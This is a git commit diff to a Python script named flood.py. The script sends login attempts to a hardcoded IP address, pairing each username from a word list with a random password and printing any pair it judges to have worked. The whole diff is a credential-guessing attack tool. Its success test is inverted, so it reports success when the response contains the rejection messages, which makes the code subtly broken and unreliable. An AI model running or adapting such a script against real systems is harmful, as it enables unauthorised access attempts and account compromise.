213d1032633d05cdcec0f5727b81a29cf8cbcf27
Albin Eriksson <40474222+kezoponk@users.noreply.github.com>
2020-05-12 11:05:57 +0200

    Update flood.py

--- dictionary/flood.py
+++ dictionary/flood.py
@@ -4,32 +4,29 @@ import random
 import string
 import json
 
-def post_it(name):
+target_url = 'http://83.160.88.114:8080'
+if_contains_then_invalid = ['not permission', 'is_invalid']
 
-    # name_extra = ''.join(random.choice(string.digits)) // Salt
+def post_it(name):
+    chars = string.ascii_letters + string.digits
+    # random.seed = (os.urandom(1024))
+    # name = name.join(random.choice(string.digits)) # Salt
 
     username = name.lower()
     password = ''.join(random.choice(chars) for i in range(8))
 
-    response = requests.post(url, allow_redirects=False, data={
-    	'username': username,
-    	'password': password,
+    response = requests.post(target_url, allow_redirects=False, data={
+        'username': username,
+        'password': password,
         'Submit': "submit"
     })
 
-    print('sending username '+username+' and password '+password+"\t"+str(response.content))
-    if "not permission" and "is invalid" not in str(response.content):
-        print("[+] {} : {} Worked".format(username, password))
+    print('Testing password '+password+' on '+username)
+    if any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid):
+        print("[+] {}s password is {}".format(username, password))
         exit(0)
 
 if __name__ == "__main__":
-
-    chars = string.ascii_letters + string.digits
-    random.seed = (os.urandom(1024))
-
-    url = 'http://83.160.88.114:8080/home.htm'
-
     names = json.loads(open('words.json').read())
-
     for name in names:
       post_it(name)
